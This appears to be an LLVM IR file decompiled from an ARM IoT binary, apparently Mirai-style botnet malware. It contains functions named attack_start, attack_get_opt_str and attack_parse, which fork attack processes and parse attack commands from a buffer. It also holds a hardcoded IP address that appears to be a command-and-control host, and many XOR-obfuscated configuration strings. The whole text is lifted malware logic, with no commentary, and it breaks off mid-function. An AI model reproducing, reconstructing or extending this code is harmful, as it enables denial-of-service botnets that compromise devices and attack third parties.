source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2300c.22 = global i32 0
@global_var_d884.26 = constant i32 -382906384
@global_var_2322c.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_14304.33 = constant i32 -382909968
@global_var_a088.39 = constant i32 -382906384
@global_var_a4c0.41 = constant i32 -382906384
@global_var_89ac.43 = constant i32 -382906384
@global_var_c1dc.45 = constant i32 -382906384
@global_var_bae4.47 = constant i32 -382906384
@global_var_b330.49 = constant i32 -382906384
@global_var_9a6c.52 = constant i32 -382906384
@global_var_93d8.54 = constant i32 -382906384
@global_var_25d48.57 = global i32 0
@global_var_1a7f8.69 = constant i32 47
@global_var_25d50.71 = global i32 0
@global_var_23230.73 = global i32 0
@global_var_25d4c.75 = global i32 0
@global_var_c700.76 = constant i32 -352321440
@global_var_9a02.77 = constant i32 1078782720
@global_var_bb01.79 = constant i32 99287072
@global_var_12298.81 = constant i32 -382910336
@global_var_d560.82 = constant i32 -509607932
@global_var_d74c.84 = constant i32 -382910448
@global_var_230c0.86 = global i32 72784
@global_var_1a7fc.88 = constant [15 x i8] c"185.55.218.173\00"
@global_var_25d58.91 = local_unnamed_addr global i32 0
@global_var_25d56.92 = local_unnamed_addr global i32 0
@global_var_23234.94 = global i32 0
@global_var_1a80c.102 = constant i32 10
@global_var_230bc.104 = global i32 -1
@global_var_230b8.108 = global i32 -1
@global_var_157e0.110 = constant i32 -450904024
@global_var_11c50.111 = constant i32 -382910352
@global_var_1a810.114 = constant i32 16777216
@global_var_2323c.116 = global i32 0
@global_var_23248.118 = global i32 0
@global_var_23240.120 = global i32 0
@global_var_23244.122 = global i32 0
@global_var_23280.136 = global i32 0
@global_var_2324c.138 = global i32 0
@global_var_23278.140 = global i32 0
@global_var_25d6c.144 = global i32 0
@global_var_25d64.148 = global i32 0
@global_var_25d68.150 = global i32 0
@global_var_23252.153 = local_unnamed_addr global i32 0
@global_var_23264.155 = global i32 0
@global_var_23254.157 = local_unnamed_addr global i32 0
@global_var_23258.158 = local_unnamed_addr global i32 0
@global_var_23259.159 = local_unnamed_addr global i32 0
@global_var_23272.162 = local_unnamed_addr global i32 0
@global_var_1a820.164 = constant [5 x i8] c"eeee\00"
@global_var_1a818.166 = constant [6 x i8] c"3!1' \00"
@global_var_1a828.168 = constant [6 x i8] c"efg`a\00"
@global_var_1a830.170 = constant [7 x i8] c"efg`ab\00"
@global_var_1a86c.172 = constant i32 0
@global_var_1a838.174 = constant [5 x i8] c"!'1&\00"
@global_var_1a840.176 = constant [8 x i8] c"0125!8 \00"
@global_var_1a848.178 = constant i32 943467547
@global_var_1a854.180 = constant i32 322070023
@global_var_1a860.182 = constant [7 x i8] c"5: '8%\00"
@global_var_1a868.184 = constant [5 x i8] c"&;; \00"
@global_var_1a870.186 = constant [6 x i8] c"\22=.,\22\00"
@global_var_1a878.188 = constant [6 x i8] c".8,,z\00"
@global_var_1a880.190 = constant [9 x i8] c"<!: acam\00"
@global_var_1a88c.192 = constant [5 x i8] c"5:?;\00"
@global_var_1a894.194 = constant [4 x i8] c"a!$\00"
@global_var_1a898.196 = constant [7 x i8] c",7gaee\00"
@global_var_1a8a0.198 = constant [8 x i8] c"'!$$;& \00"
@global_var_1a8a8.200 = constant [7 x i8] c"93gadd\00"
@global_var_1a8b0.202 = constant [7 x i8] c"91&8=:\00"
@global_var_1a8b8.204 = constant [6 x i8] c"509=:\00"
@global_var_1a8c0.206 = constant [7 x i8] c"x65fg`\00"
@global_var_1a8c8.208 = constant [8 x i8] c"5%!5&=;\00"
@global_var_1a8d0.210 = constant [4 x i8] c"6=:\00"
@global_var_2325c.211 = local_unnamed_addr global i32 0
@global_var_23260.213 = local_unnamed_addr global i32 0
@global_var_2325a.214 = local_unnamed_addr global i32 0
@global_var_23274.216 = local_unnamed_addr global i32 0
@global_var_23268.217 = local_unnamed_addr global i32 0
@global_var_e254.223 = constant i32 -382910352
@global_var_1a8d4.225 = constant [3 x i8] c"\0D\0A\00"
@global_var_1a8e0.227 = constant i32 2096127
@global_var_1a8d7.229 = constant i32 2095871
@global_var_25d74.235 = global i32 0
@global_var_230c4.238 = global i32 -555811921
@global_var_1a8e4.243 = constant [3 x i8] c"RS\00"
@global_var_25d7c.244 = local_unnamed_addr global i32 0
@global_var_25d80.245 = local_unnamed_addr global i32 0
@global_var_1a8e8.247 = constant [3 x i8] c"DR\00"
@global_var_25d84.248 = local_unnamed_addr global i32 0
@global_var_25d88.249 = local_unnamed_addr global i32 0
@global_var_1a8ec.251 = constant i32 102040347
@global_var_25d90.252 = local_unnamed_addr global i32 0
@global_var_25d8c.253 = local_unnamed_addr global i32 0
@global_var_1a904.255 = constant [7 x i8] c"'<188T\00"
@global_var_25d94.256 = local_unnamed_addr global i32 0
@global_var_25d98.257 = local_unnamed_addr global i32 0
@global_var_1a90c.259 = constant [8 x i8] c"1:5681T\00"
@global_var_25d9c.260 = local_unnamed_addr global i32 0
@global_var_25da0.261 = local_unnamed_addr global i32 0
@global_var_1a914.263 = constant [8 x i8] c"'-' 19T\00"
@global_var_25da4.264 = local_unnamed_addr global i32 0
@global_var_25da8.265 = local_unnamed_addr global i32 0
@global_var_1a91c.267 = constant [4 x i8] c"'<T\00"
@global_var_25db0.268 = local_unnamed_addr global i32 0
@global_var_25dac.269 = local_unnamed_addr global i32 0
@global_var_1a920.271 = constant i32 977090171
@global_var_25db8.272 = local_unnamed_addr global i32 0
@global_var_25db4.273 = local_unnamed_addr global i32 0
@global_var_1a934.275 = constant i32 102040347
@global_var_25dc0.276 = local_unnamed_addr global i32 0
@global_var_25dbc.277 = local_unnamed_addr global i32 0
@global_var_1a950.279 = constant [10 x i8] c":7;&&17 T\00"
@global_var_25dc8.280 = local_unnamed_addr global i32 0
@global_var_25dc4.281 = local_unnamed_addr global i32 0
@global_var_1a95c.283 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_25dcc.284 = local_unnamed_addr global i32 0
@global_var_25dd0.285 = local_unnamed_addr global i32 0
@global_var_1a970.287 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_25dd8.288 = local_unnamed_addr global i32 0
@global_var_25dd4.289 = local_unnamed_addr global i32 0
@global_var_1a988.291 = constant [8 x i8] c"{$&;7{T\00"
@global_var_25ddc.292 = local_unnamed_addr global i32 0
@global_var_25de0.293 = local_unnamed_addr global i32 0
@global_var_1a990.295 = constant [6 x i8] c"{1,1T\00"
@global_var_25de4.296 = local_unnamed_addr global i32 0
@global_var_25de8.297 = local_unnamed_addr global i32 0
@global_var_1a998.299 = constant [5 x i8] c"{20T\00"
@global_var_25df0.300 = local_unnamed_addr global i32 0
@global_var_25dec.301 = local_unnamed_addr global i32 0
@global_var_1a9a0.303 = constant [7 x i8] c"{95$'T\00"
@global_var_25df4.304 = local_unnamed_addr global i32 0
@global_var_25df8.305 = local_unnamed_addr global i32 0
@global_var_1a9a8.307 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_25dfc.308 = local_unnamed_addr global i32 0
@global_var_25e00.309 = local_unnamed_addr global i32 0
@global_var_1a9b8.311 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_25e5c.312 = local_unnamed_addr global i32 0
@global_var_25e60.313 = local_unnamed_addr global i32 0
@global_var_1a9c4.315 = constant [8 x i8] c"z5:=91T\00"
@global_var_25e64.316 = local_unnamed_addr global i32 0
@global_var_25e68.317 = local_unnamed_addr global i32 0
@global_var_1a9cc.319 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_25e04.320 = local_unnamed_addr global i32 0
@global_var_25e08.321 = local_unnamed_addr global i32 0
@global_var_1a9e0.323 = constant [9 x i8] c"5''#;&0T\00"
@global_var_25e0c.324 = local_unnamed_addr global i32 0
@global_var_25e10.325 = local_unnamed_addr global i32 0
@global_var_1aa68.327 = constant i32 557516544
@global_var_25e18.328 = local_unnamed_addr global i32 0
@global_var_25e14.329 = local_unnamed_addr global i32 0
@global_var_1a9ec.331 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_25e20.332 = local_unnamed_addr global i32 0
@global_var_25e1c.333 = local_unnamed_addr global i32 0
@global_var_1aa00.335 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25e28.336 = local_unnamed_addr global i32 0
@global_var_25e24.337 = local_unnamed_addr global i32 0
@global_var_1aa10.339 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_25e2c.340 = local_unnamed_addr global i32 0
@global_var_25e30.341 = local_unnamed_addr global i32 0
@global_var_1aa20.343 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_25e38.344 = local_unnamed_addr global i32 0
@global_var_25e34.345 = local_unnamed_addr global i32 0
@global_var_1aa34.347 = constant [9 x i8] c"$662*7!E\00"
@global_var_25e3c.348 = local_unnamed_addr global i32 0
@global_var_25e40.349 = local_unnamed_addr global i32 0
@global_var_1aa40.351 = constant [6 x i8] c";3=:T\00"
@global_var_25e44.352 = local_unnamed_addr global i32 0
@global_var_25e48.353 = local_unnamed_addr global i32 0
@global_var_1aa48.355 = constant [7 x i8] c"1: 1&T\00"
@global_var_25e4c.356 = local_unnamed_addr global i32 0
@global_var_25e50.357 = local_unnamed_addr global i32 0
@global_var_1aa50.359 = constant [24 x i8] c"m!efg``l!ef`5!le`0`,edT\00"
@global_var_25e58.360 = local_unnamed_addr global i32 0
@global_var_25e54.361 = local_unnamed_addr global i32 0
@global_var_23010.367 = global i32 0
@global_var_10b24.383 = constant i32 -481165275
@global_var_125f0.390 = constant i32 -443088884
@global_var_12a8c.406 = constant i32 -456978431
@global_var_10444.415 = constant i32 56361081
@global_var_10068.437 = constant i32 -481165216
@global_var_132c4.449 = constant i32 -478871519
@global_var_13d68.466 = constant i32 -478805983
@global_var_14150.476 = constant i32 -382906384
@global_var_16260.485 = constant i32 -442544040
@global_var_14ae8.508 = constant i32 -369098502
@global_var_154bc.522 = constant i32 -382910288
@global_var_da50.532 = constant i32 -509607927
@global_var_1566c.535 = constant i32 -2020859901
@global_var_15758.538 = constant i32 -494075872
@global_var_1245c.539 = constant i32 -382910336
@global_var_261f4.542 = local_unnamed_addr global i32 0
@global_var_14580.556 = constant i32 -442543860
@global_var_129f0.565 = constant i32 -369093190
@global_var_cf84.582 = constant i32 -476053491
@global_var_cdd0.590 = constant i32 -509607926
@global_var_16758.593 = constant i32 -382910352
@global_var_cb10.601 = constant i32 -494927832
@global_var_17b68.615 = constant i32 -382906384
@global_var_17628.643 = constant i32 -382910448
@global_var_19018.644 = constant i32 -382909968
@global_var_9f00.698 = constant [3 x i8] c"t\0A\00"
@global_var_19754.707 = constant i32 -481296376
@global_var_1984c.708 = constant i32 -481296376
@global_var_198d0.709 = constant i32 -369098732
@global_var_2320c.12 = external global i8*
@global_var_23228.29 = external global i8*
@global_var_23229.37 = global i8 0
@global_var_25d54.90 = global i16* null
@global_var_23238.106 = external global i8*
@global_var_2327c.142 = global i16* null
@global_var_23250.152 = external global i8*
@global_var_23270.156 = local_unnamed_addr global i8 0
@global_var_23266.160 = local_unnamed_addr global i16 0
@global_var_23271.161 = local_unnamed_addr global i8 0
@global_var_23068.363 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2320c.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_2320c.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2320c.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_2300c.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_2300c.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2300c.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d884.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 108520, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_23228.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_2322c.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_2322c.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
